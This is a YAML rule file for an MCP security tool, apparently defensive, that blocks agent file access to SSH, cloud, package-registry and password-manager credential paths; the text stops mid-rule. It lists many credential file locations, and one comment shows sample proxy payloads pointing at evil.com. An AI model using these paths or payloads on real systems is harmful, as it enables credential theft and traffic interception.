name: "MCP Secrets & Credentials"
description: "Block MCP tool access to credential files, sensitive directories, and database URIs"
version: "1.0.0"
author: "AgentShield Security Research"

blocked_resources:
  - "file:///home/*/.ssh/**"
  - "file:///root/.ssh/**"
  - "file:///home/*/.aws/**"
  - "file:///root/.aws/**"
  - "file:///home/*/.gnupg/**"
  - "file:///root/.gnupg/**"

rules:
  # === BLOCK: SSH key directory access ===
  - id: mcp-sec-block-ssh-access
    taxonomy: "credential-exposure/private-key-access/ssh-private-key-read"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "write_to_file"
      argument_patterns:
        path: "**/.ssh/**"
    decision: "BLOCK"
    reason: "Access to SSH key directories is blocked."

  # === BLOCK: AWS credential access ===
  - id: mcp-sec-block-aws-access
    taxonomy: "credential-exposure/cloud-credentials/cloud-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "write_to_file"
      argument_patterns:
        path: "**/.aws/**"
    decision: "BLOCK"
    reason: "Access to AWS credential directories is blocked."

  # === BLOCK: GPG key access ===
  - id: mcp-sec-block-gnupg-access
    taxonomy: "credential-exposure/cryptographic-keys/gpg-key-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
      argument_patterns:
        path: "**/.gnupg/**"
    decision: "BLOCK"
    reason: "Access to GPG key directories is blocked."

  # === BLOCK: Kubernetes config access ===
  - id: mcp-sec-block-kube-access
    taxonomy: "credential-exposure/container-config/kubernetes-config-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
      argument_patterns:
        path: "**/.kube/**"
    decision: "BLOCK"
    reason: "Access to Kubernetes config is blocked."

  # === BLOCK: Cloud CLI credentials ===
  - id: mcp-sec-block-gcloud-access
    taxonomy: "credential-exposure/cloud-credentials/cloud-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
      argument_patterns:
        path: "**/.config/gcloud/**"
    decision: "BLOCK"
    reason: "Access to Google Cloud credentials is blocked."

  # === BLOCK: Azure credentials (issue #24) ===
  # ~/.azure/ contains OAuth access tokens, MSAL token cache, and service principal credentials
  # used by Azure CLI, Azure SDK, and Azure PowerShell.
  - id: mcp-sec-block-azure-credentials
    taxonomy: "credential-exposure/cloud-credentials/azure-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "cat_file"
        - "get_file_contents"
        - "open_file"
        - "view_file"
        - "write_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "write_to_file"
      argument_patterns:
        path: "**/.azure/**"
    decision: "BLOCK"
    reason: "Access to Azure credential directory is blocked — contains OAuth tokens, MSAL token cache, service principal credentials, and subscription info. MITRE T1552.005."

  # === BLOCK: .env file reads ===
  - id: mcp-sec-block-dotenv-read
    taxonomy: "credential-exposure/config-file-access/dotenv-file-read"
    match:
      tool_name_any:
        - "read_file"
        - "cat_file"
      argument_patterns:
        path: "**/.env"
    decision: "AUDIT"
    reason: ".env file access flagged for review — may contain secrets."

  # === BLOCK: Git credentials (issue #5) ===
  # ~/.git-credentials stores plaintext credentials in format https://user:password@host
  # Reading exposes credentials; writing can poison git auth to redirect to attacker hosts.
  - id: mcp-sec-block-git-credentials
    taxonomy: "credential-exposure/version-control/git-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "cat_file"
        - "write_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "write_to_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.git-credentials"
    decision: "BLOCK"
    reason: "Git credential file access is blocked — contains plaintext credentials; writes can redirect git auth to attacker-controlled hosts."

  # === BLOCK: Package manager credential files ===
  # npmrc (user-level) contains //registry.npmjs.org/:_authToken=<secret>
  # pypirc contains plaintext PyPI username/password
  # cargo credentials.toml contains crates.io registry tokens
  # gradle.properties (user-level) can contain Maven/Gradle repository passwords
  # NOTE: .npmrc WRITE is intentionally excluded here. Project-level .npmrc files are legitimately
  # written by agents (e.g., save-exact=true). Shell-level sc-block-npmrc-edit handles malicious
  # registry redirects. Only block READS since any .npmrc (user or project) may hold auth tokens.
  - id: mcp-sec-block-package-manager-creds
    taxonomy: "credential-exposure/package-registry/package-manager-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "cat_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.npmrc"
    decision: "BLOCK"
    reason: "Read access to .npmrc is blocked — contains npm registry auth tokens that could be exfiltrated."

  - id: mcp-sec-block-pypirc
    taxonomy: "credential-exposure/package-registry/package-manager-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "cat_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.pypirc"
    decision: "BLOCK"
    reason: "Access to .pypirc is blocked — contains plaintext PyPI credentials."

  # ~/.cargo/credentials (legacy, pre-Cargo 1.60) and ~/.cargo/credentials.toml (modern)
  # both contain crates.io and private registry authentication tokens.
  - id: mcp-sec-block-cargo-credentials
    taxonomy: "credential-exposure/package-registry/package-manager-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "cat_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.cargo/credentials*"
    decision: "BLOCK"
    reason: "Access to Cargo credential files is blocked — contains crates.io and private registry tokens (both legacy ~/.cargo/credentials and modern ~/.cargo/credentials.toml)."

  # === BLOCK: Poetry private registry credentials ===
  # ~/.config/pypoetry/auth.toml — HTTP auth tokens for private PyPI repositories
  # ~/.config/pypoetry/config.toml — may include source URLs with embedded credentials
  # An agent reading auth.toml can exfiltrate tokens used to access or publish to private PyPI repos.
  # MITRE T1552 — Unsecured Credentials
  - id: mcp-sec-block-pypoetry-credentials
    taxonomy: "credential-exposure/package-registry/package-manager-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "write_to_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.config/pypoetry/auth.toml"
    decision: "BLOCK"
    reason: "Access to Poetry auth.toml is blocked — contains HTTP auth tokens for private PyPI repositories. MITRE T1552."
    confidence: 0.95

  - id: mcp-sec-block-gradle-properties
    taxonomy: "credential-exposure/package-registry/package-manager-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "cat_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.gradle/gradle.properties"
    decision: "BLOCK"
    reason: "Access to Gradle user properties is blocked — may contain Maven/Gradle repository passwords."

  # === BLOCK: Helm registry credential files ===
  # ~/.config/helm/repositories.yaml contains repo URLs and passwords
  # ~/.config/helm/registry/config.json contains OCI registry login credentials
  - id: mcp-sec-block-helm-credentials
    taxonomy: "credential-exposure/cloud-credentials/helm-registry-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "write_to_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.config/helm/**"
    decision: "BLOCK"
    reason: "Access to Helm config directory is blocked — contains OCI registry credentials and repository passwords."

  # === BLOCK: Docker daemon config access (issue #4) ===
  # ~/.docker/daemon.json configures the Docker daemon — it can contain:
  #   - insecure-registries: lists private registries without TLS verification
  #   - registry-mirrors: reveals internal mirror infrastructure
  #   - credHelpers mappings: exposes which external credential stores are in use
  #   - HTTP proxy settings with embedded credentials (http-proxy, https-proxy)
  # ~/.docker/buildx/: buildx configuration with remote build context creds
  # Reading this file leaks Docker infrastructure layout even when config.json
  # (blocked separately) holds no explicit credentials.
  # MITRE T1552 — Unsecured Credentials
  - id: mcp-sec-block-docker-daemon-access
    taxonomy: "credential-exposure/config-file-access/docker-daemon-config-read"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "write_to_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.docker/daemon.json"
    decision: "BLOCK"
    reason: "Access to ~/.docker/daemon.json is blocked — exposes Docker registry infrastructure, insecure-registries list, proxy credentials, and credHelpers configuration. MITRE T1552."

  # === BLOCK: 1Password CLI credential access ===
  - id: mcp-sec-block-1password-cli-access
    taxonomy: "credential-exposure/password-manager/1password-cli-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "write_to_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.config/op/**"
    decision: "BLOCK"
    reason: "Access to 1Password CLI config directory is blocked — contains session tokens and account credentials."

  # === BLOCK: GNOME Keyring wallet access ===
  - id: mcp-sec-block-gnome-keyring-access
    taxonomy: "credential-exposure/password-manager/gnome-keyring-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "write_to_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.local/share/keyrings/**"
    decision: "BLOCK"
    reason: "Access to GNOME Keyring wallet files is blocked — contains encrypted credential stores."

  # === BLOCK: GitHub Copilot OAuth token access ===
  - id: mcp-sec-block-github-copilot-access
    taxonomy: "credential-exposure/oauth-tokens/github-copilot-token-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "write_to_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.config/github-copilot/**"
    decision: "BLOCK"
    reason: "Access to GitHub Copilot config is blocked — contains OAuth tokens for GitHub authentication."

  # === BLOCK: Bitwarden CLI data files (issue #636) ===
  # ~/.local/share/bitwarden-cli/data.json — encrypted vault + cached session tokens (XDG data)
  # ~/.config/bitwarden-cli/data.json — config variant on some systems
  - id: mcp-sec-block-bitwarden-cli-access
    taxonomy: "credential-exposure/password-manager/bitwarden-cli-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "write_to_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.local/share/bitwarden-cli/**"
    decision: "BLOCK"
    reason: "Access to Bitwarden CLI data directory is blocked — contains encrypted vault data and cached session tokens."

  - id: mcp-sec-block-bitwarden-cli-config-access
    taxonomy: "credential-exposure/password-manager/bitwarden-cli-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "write_to_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.config/bitwarden-cli/**"
    decision: "BLOCK"
    reason: "Access to Bitwarden CLI config directory is blocked — contains encrypted vault data and account credentials."

  # === BLOCK: age encryption identity files (issue #637) ===
  # ~/.config/age/keys.txt — age identity file used to decrypt secrets (equivalent to a private key)
  # Used with chezmoi, sops, and age-encrypted secret stores
  - id: mcp-sec-block-age-identity-access
    taxonomy: "credential-exposure/cryptographic-keys/age-identity-key-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "write_to_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.config/age/**"
    decision: "BLOCK"
    reason: "Access to age encryption identity directory is blocked — age identity files are used to decrypt sensitive data stores (sops, chezmoi)."

  # === BLOCK: curl/wget network proxy configuration writes via MCP (issue #641) ===
  #
  # ~/.curlrc and ~/.wgetrc configure ALL subsequent curl/wget requests system-wide.
  # Writing a malicious proxy directive here routes every future outbound HTTP/HTTPS
  # request — including API tokens, git credentials, and cloud auth — through an
  # attacker-controlled proxy without any shell command or user interaction.
  #
  # Common attack payloads:
  #   .curlrc:  proxy=http://evil.com:8080  +  insecure  (disables TLS verification)
  #   .wgetrc:  http_proxy=http://evil.com:8080  +  check_certificate=off
  #
  # This is MCP-specific because a write_file call bypasses all shell-level rules
  # (sc-block-curlrc-write in terminal-safety.yaml doesn't fire — there's no shell).
  # Reads are intentionally not blocked: learning what proxy is configured is
  # reconnaissance (AUDIT by default), not an immediate exfiltration risk.
  #
  # MITRE T1557   — Adversary-in-the-Middle (proxy intercepts all outbound traffic)
  # MITRE T1071.001 — Application Layer Protocol: Web Protocols
  - id: mcp-sec-block-curlrc-write
    taxonomy: "data-exfiltration/network-exfiltration/network-config-tampering"
    match:
      tool_name_any:
        - "write_file"
        - "create_file"
        - "edit_file"
        - "write_to_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "filesystem_write"
        - "str_replace_editor"
        - "str_replace_based_edit_tool"
      argument_patterns:
        path: "**/.curlrc"
    decision: "BLOCK"
    reason: "MCP write to ~/.curlrc — any proxy directive injected here silently intercepts all future curl traffic (including auth tokens and API credentials) via MITM. MITRE T1557."
    confidence: 0.95

  - id: mcp-sec-block-wgetrc-write
    taxonomy: "data-exfiltration/network-exfiltration/network-config-tampering"
    match:
      tool_name_any:
        - "write_file"
        - "create_file"
        - "edit_file"
        - "write_to_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "filesystem_write"
        - "str_replace_editor"
        - "str_replace_based_edit_tool"
      argument_patterns:
        path: "**/.wgetrc"
    decision: "BLOCK"
    reason: "MCP write to ~/.wgetrc — any proxy directive injected here silently intercepts all future wget traffic (including auth tokens and credentials) via MITM. MITRE T1557."
    confidence: 0.95

  # === BLOCK: pass (Unix password manager) store access (issue #12) ===
  # ~/.password-store/ holds GPG-encrypted credential files. Each file is
  # encrypted for the key listed in ~/.password-store/.gpg-id. Reading any
  # file in the store exposes encrypted secrets; reading .gpg-id reveals
  # the encryption key fingerprint, enabling targeted key compromise.
  # MITRE T1552 — Unsecured Credentials
  - id: mcp-sec-block-pass-store-access
    taxonomy: "credential-exposure/password-manager/pass-store-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "str_replace_based_edit_tool"
        - "write_to_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.password-store/**"
    decision: "BLOCK"
    reason: "Access to ~/.password-store is blocked — contains GPG-encrypted passwords; reading .gpg-id reveals the encryption key fingerprint. MITRE T1552."
    confidence: 0.95

  # === BLOCK: KeePassXC config access (issue #12) ===
  # ~/.config/keepassxc/ contains KeePassXC configuration including database
  # file paths, recent files list, and plugin configurations. Exposing the
  # database path enables targeted theft of the KeePass vault file.
  # MITRE T1552 — Unsecured Credentials
  - id: mcp-sec-block-keepassxc-access
    taxonomy: "credential-exposure/password-manager/keepassxc-config-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "str_replace_based_edit_tool"
        - "write_to_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.config/keepassxc/**"
    decision: "BLOCK"
    reason: "Access to KeePassXC config directory is blocked — exposes database file paths, recent vault locations, and plugin configurations enabling targeted vault theft. MITRE T1552."
    confidence: 0.92

  # === BLOCK: macOS Keychain database access (issue #12) ===
  # ~/Library/Keychains/login.keychain-db is the user's primary macOS Keychain —
  # the encrypted store for all saved passwords, certificates, and private keys.
  # ~/Library/Keychains/login.keychain (legacy pre-Sierra format) is equivalent.
  # While the database is encrypted, transferring it offline enables brute-force
  # attacks, and the file may be accessible during an active unlocked session.
  # MITRE T1555.001 — Credentials from Password Stores: Keychain
  - id: mcp-sec-block-macos-keychain-access
    taxonomy: "credential-exposure/password-manager/macos-keychain-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "str_replace_based_edit_tool"
        - "write_to_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/Library/Keychains/**"
    decision: "BLOCK"
    reason: "Access to macOS Keychain database files is blocked — contains all saved passwords, certificates, and private keys; offline copy enables brute-force decryption. MITRE T1555.001."
    confidence: 0.95

  # === BLOCK: Bitwarden app data directory (issue #12) ===
  # ~/.bitwarden/ is used by some Bitwarden app variants (Flatpak, AppImage,
  # unofficial builds) for cached vault data including encrypted credentials
  # and session tokens. Distinct from the Bitwarden CLI paths already blocked
  # (~/.local/share/bitwarden-cli/ and ~/.config/bitwarden-cli/).
  # MITRE T1555 — Credentials from Password Stores
  - id: mcp-sec-block-bitwarden-app-access
    taxonomy: "credential-exposure/password-manager/bitwarden-cli-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "str_replace_based_edit_tool"
        - "write_to_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.bitwarden/**"
    decision: "BLOCK"
    reason: "Access to ~/.bitwarden directory is blocked — contains Bitwarden app cached vault data and session tokens. MITRE T1555."
    confidence: 0.92

  # === BLOCK: rclone cloud storage credentials (issue #17) ===
  # ~/.config/rclone/rclone.conf contains credentials for all configured remotes:
  # AWS S3, Google Cloud Storage, Azure Blob, Dropbox, OneDrive, Backblaze B2, etc.
  # A single rclone.conf can expose dozens of cloud storage accounts.
  # MITRE T1552 — Unsecured Credentials
  - id: mcp-sec-block-rclone-credentials
    taxonomy: "credential-exposure/cloud-credentials/cloud-storage-credential-access"
    match:
      tool_name_any:
        - "read_file"
        - "write_file"
        - "cat_file"
        - "create_file"
        - "edit_file"
        - "save_file"
        - "update_file"
        - "append_file"
        - "str_replace_editor"
        - "str_replace_based_edit_tool"
        - "write_to_file"
        - "open_file"
        - "view_file"
        - "get_file_contents"
      argument_patterns:
        path: "**/.config/rclone/rclone.conf"
    decision: "BLOCK"
    reason: "Access to rclone config is blocked — contains credentials for all configured cloud storage remotes (S3, GCS, Azure, Dropbox, etc.). MITRE T1552."
    confidence: 0.97

  # === BLOCK: s3cmd / boto cloud storage credentials (issue #17) ===
  # ~/.s3cfg — s3cmd config with AWS access key ID and secret access key
  # ~/.boto — Python boto/boto3/gsutil config with AWS or GCP credentials
  # ~/.config/s3cmd/s3cfg — alternate XDG path for s3cmd
  # MITRE T1552 — Unsecured Credentials
  - id: mcp-sec-block-s3cmd-credentials
    taxonomy: "credential-exposure/cloud-credentials/cloud-storage-credential-access"
    match:
      tool_name_any:
